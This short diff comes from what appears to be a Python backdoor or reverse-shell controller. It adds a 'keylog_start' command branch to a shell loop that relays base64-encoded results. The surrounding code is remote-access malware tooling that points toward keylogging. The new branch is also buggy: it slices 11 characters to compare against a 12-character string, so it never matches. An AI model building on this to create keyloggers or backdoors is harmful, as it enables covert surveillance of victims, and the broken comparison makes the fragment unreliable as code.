@@ -38,6 +38,8 @@ def shell():
             except:
                 failed = "Failed to uplaod file\n"
                 reliable_send(base64.b64encode(failed))
+        elif command[:11] == "keylog_start":
+            continue
         else:
             result = reliable_recv()
             print(result)
